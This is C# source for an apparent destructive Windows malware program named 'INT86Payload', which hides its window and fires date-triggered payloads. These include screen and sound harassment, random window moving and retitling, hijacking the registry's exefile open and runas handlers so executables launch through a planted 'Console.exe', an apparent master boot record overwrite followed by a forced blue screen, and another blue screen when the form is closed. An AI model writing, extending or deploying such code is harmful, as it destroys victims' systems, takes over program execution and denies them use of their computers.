using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using Microsoft.Win32;
using System.Media;

namespace INT86Payload
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            timer1.Interval = 100;
            timer1.Tick += new EventHandler(timer1_Tick);
            timer2.Interval = 10;
            timer2.Tick += new EventHandler(timer2_Tick);
        }

        DateTime date = DateTime.Now;
        private SoundPlayer player;

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern int SendMessage(IntPtr hWnd, int msg, IntPtr wParam, string lParam);

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide(); /* DATE: 12/13, 4/20, 6/7, 9/11, 11/1 */
            if (date.Month == 12 && date.Day == 13)
            {
                //PlayByteBeatSound();
                timer1.Start();
                Sound();
                var gdi_payload = new gdi();
                gdi_payload.gdi_payload();
                var icon_payload = new icon_move();
                icon_payload.moves_icon();
            }
            if (date.Month == 4 && date.Day == 20)
            {
                timer1.Start();
                HandSound();
            }
            if (date.Month == 6 && date.Day == 7)
            {
                timer2.Start();
                var gdi2_payload = new gdi();
                gdi2_payload.gdi2_payload();
                HandSound();
            }
            if (date.Month == 9 && date.Day == 11)
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\exefile\\shell\\open\\command", "", "\"C:\\Program Files\\Windows Process Service\\Console.exe\" \"%1\" &*", RegistryValueKind.String);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\exefile\\shell\\runas\\command", "", "\"C:\\Program Files\\Windows Process Service\\Console.exe\" \"%1\" &*", RegistryValueKind.String);
            }
            if (date.Month == 11 && date.Day == 1)
            {
                MBR.mbr_start();
                Thread.Sleep(1000);
                BSOD.bsod_start();
            }
        }

        public static class MessageBoxEx
        {
            [System.Runtime.InteropServices.DllImport("user32.dll")]
            private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

            [System.Runtime.InteropServices.DllImport("user32.dll")]
            private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

            public static void SetPosition(int x, int y)
            {
                IntPtr hWnd = FindWindow(null, "Error");
                if (hWnd != IntPtr.Zero)
                {
                    SetWindowPos(hWnd, IntPtr.Zero, x, y, 0, 0, 0x0001);
                }
            }
        }
        private void PlayByteBeatSound()
        {
            int sampleRate = 44100;
            int durationInSeconds = 1000;
            int numSamples = sampleRate * durationInSeconds;

            short[] audioBuffer = new short[numSamples];

            for (int i = 0; i < numSamples; i++)
            {
                double t = (double)i / sampleRate;
                int tInt = (int)t;

                double frequency = ((tInt * 1000) & ((tInt * 10 + 25) % 2)) * (int)(tInt >> 7) * t;

                short sampleValue = (short)(Math.Sin(2 * Math.PI * frequency * t) * short.MaxValue);

                audioBuffer[i] = sampleValue;
            }

            using (MemoryStream stream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(stream))
            {
                foreach (short sample in audioBuffer)
                {
                    writer.Write(sample);
                }

                stream.Seek(0, SeekOrigin.Begin);
                SoundPlayer player = new SoundPlayer(stream);
                player.PlaySync();
            }
        }

        private void Sound()
        {
            Stream strm = Properties.Resources.CreepySound;
            player = new SoundPlayer(strm);
            //player.Play();
            player.PlayLooping();
        }

        public static void HandSound()
        {
            Random random = new Random();

            while (true)
            {
                int randomNumber = random.Next(1, 3);
                switch (randomNumber)
                {
                    case 1:
                        System.Media.SystemSounds.Hand.Play();
                        break;
                    case 2:
                        System.Media.SystemSounds.Exclamation.Play();
                        break;
                }
                Thread.Sleep(random.Next(250, 750));
            }
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            //msgbox();

            IntPtr activeWindowHandle = GetForegroundWindow();

            Rectangle screenBounds = Screen.PrimaryScreen.Bounds;

            Random rand = new Random();
            int newX = rand.Next(screenBounds.Width);
            int newY = rand.Next(screenBounds.Height);

            SetWindowPos(activeWindowHandle, IntPtr.Zero, newX, newY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

            Thread.Sleep(10);
        }

        private const int SWP_NOSIZE = 0x0001;
        private const int SWP_NOZORDER = 0x0004;

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        public void msgbox()
        {
            MessageBox.Show("", "", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            IntPtr hWnd = GetForegroundWindow();
            StringBuilder title = new StringBuilder(256);
            GetWindowText(hWnd, title, title.Capacity);
            if (!string.IsNullOrEmpty(title.ToString()))
            {
                SetWindowText(hWnd, "868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686");
            }
        }


        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int SetWindowText(IntPtr hWnd, string lpString);

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            BSOD.bsod_start();
        }
    }
}
